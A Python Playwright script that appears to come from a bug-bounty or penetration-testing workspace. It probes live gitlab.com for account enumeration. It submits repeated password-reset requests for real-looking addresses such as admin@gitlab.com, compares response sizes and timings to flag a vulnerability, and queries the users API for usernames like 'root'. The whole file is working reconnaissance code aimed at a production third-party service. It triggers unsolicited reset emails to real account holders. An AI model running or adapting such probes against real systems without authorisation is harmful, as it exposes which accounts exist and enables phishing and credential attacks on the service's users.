"""
Playwright email enumeration verification for GitLab production
Tests password reset response differences
"""
import time
from playwright.sync_api import sync_playwright

GITLAB = "https://gitlab.com"
RESULTS = []


def log(msg):
    print(f"[*] {msg}")


def test_password_reset_enumeration(page):
    """Test if password reset reveals whether an email exists."""
    log("Testing email enumeration via password reset on production...")

    # Test with a known-existing email pattern and non-existent
    test_cases = [
        # Use generic gitlab accounts that are likely to exist
        {"email": "admin@gitlab.com", "label": "likely-exists"},
        {"email": "support@gitlab.com", "label": "likely-exists-2"},
        {"email": "xyznonexistent98765@nobodyhasthis.com", "label": "non-existent"},
        {"email": "alsononexistent12345@fakeemail999.com", "label": "non-existent-2"},
        {"email": "thirdnonexistent77777@norealdomain.com", "label": "non-existent-3"},
    ]

    results = {}
    for tc in test_cases:
        sizes = []
        timings = []
        for attempt in range(3):
            page.goto(f"{GITLAB}/users/password/new")
            page.wait_for_load_state("networkidle")

            page.fill('input[name="user[email]"]', tc["email"])

            start = time.time()
            page.click('input[type="submit"], button[type="submit"]')
            page.wait_for_load_state("networkidle")
            elapsed = time.time() - start

            # Get response details
            content = page.content()
            url = page.url

            sizes.append(len(content))
            timings.append(round(elapsed, 3))

            # Check for different messages
            has_error = page.query_selector('.flash-alert, .alert-danger, [data-testid="alert-danger"]')
            has_success = page.query_selector('.flash-notice, .alert-success, [data-testid="alert-info"]')

            error_text = has_error.inner_text() if has_error else "none"
            success_text = has_success.inner_text() if has_success else "none"

            log(f"  {tc['label']} ({tc['email']}): size={len(content)}, time={elapsed:.3f}s, url={url}")
            log(f"    error: {error_text[:100]}, success: {success_text[:100]}")

            time.sleep(1)  # Rate limit courtesy

        results[tc["label"]] = {
            "email": tc["email"],
            "sizes": sizes,
            "timings": timings,
            "avg_size": sum(sizes) / len(sizes),
            "avg_time": sum(timings) / len(timings),
        }

    # Analyze
    log("\n=== ANALYSIS ===")
    exist_sizes = []
    nonexist_sizes = []
    for label, data in results.items():
        if "non-existent" in label:
            nonexist_sizes.extend(data["sizes"])
        else:
            exist_sizes.extend(data["sizes"])

    if exist_sizes and nonexist_sizes:
        avg_exist = sum(exist_sizes) / len(exist_sizes)
        avg_nonexist = sum(nonexist_sizes) / len(nonexist_sizes)
        diff = abs(avg_exist - avg_nonexist)

        log(f"Average response size (likely existing): {avg_exist:.0f} bytes")
        log(f"Average response size (non-existent): {avg_nonexist:.0f} bytes")
        log(f"Difference: {diff:.0f} bytes")

        if diff > 10:
            log("!!! VULNERABLE: Consistent size difference detected - email enumeration possible")
        else:
            log("Response sizes are similar - enumeration may not work via size")

    # Check timing
    exist_times = []
    nonexist_times = []
    for label, data in results.items():
        if "non-existent" in label:
            nonexist_times.extend(data["timings"])
        else:
            exist_times.extend(data["timings"])

    if exist_times and nonexist_times:
        avg_exist_t = sum(exist_times) / len(exist_times)
        avg_nonexist_t = sum(nonexist_times) / len(nonexist_times)
        log(f"\nAverage response time (likely existing): {avg_exist_t:.3f}s")
        log(f"Average response time (non-existent): {avg_nonexist_t:.3f}s")
        log(f"Time difference: {abs(avg_exist_t - avg_nonexist_t):.3f}s")

        if abs(avg_exist_t - avg_nonexist_t) > 0.5:
            log("!!! POTENTIAL TIMING ATTACK: Significant timing difference detected")

    return results


def test_signup_enumeration(page):
    """Test if signup reveals whether an email/username exists."""
    log("\n=== SIGNUP ENUMERATION TEST ===")

    page.goto(f"{GITLAB}/users/sign_up")
    page.wait_for_load_state("networkidle")

    # Check if there's a username check endpoint
    log("Testing username existence check...")

    # GitLab has a real-time username check via API
    result = page.evaluate("""async () => {
        const tests = [
            {username: 'root', label: 'exists'},
            {username: 'gitlab-bot', label: 'likely-exists'},
            {username: 'xyznonexistent98765abc', label: 'non-existent'},
        ];
        const results = [];
        for (const t of tests) {
            try {
                const resp = await fetch(`https://gitlab.com/api/v4/users?username=${t.username}`);
                const data = await resp.json();
                results.push({
                    username: t.username,
                    label: t.label,
                    status: resp.status,
                    found: data.length > 0,
                    user_count: data.length
                });
            } catch(e) {
                results.push({username: t.username, label: t.label, error: e.message});
            }
        }
        return results;
    }""")

    for r in result:
        log(f"  Username '{r.get('username')}' ({r.get('label')}): found={r.get('found')}, count={r.get('user_count')}")

    return result


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            record_video_dir="./evidence/",
            record_video_size={"width": 1280, "height": 720},
        )
        page = context.new_page()

        # Test 1: Password reset enumeration
        reset_results = test_password_reset_enumeration(page)

        # Test 2: Signup/username enumeration
        signup_results = test_signup_enumeration(page)

        log("\n" + "=" * 60)
        log("COMPLETE")
        log("=" * 60)
        log("Evidence videos saved to targets/gitlab/evidence/")

        context.close()
        browser.close()


if __name__ == "__main__":
    main()
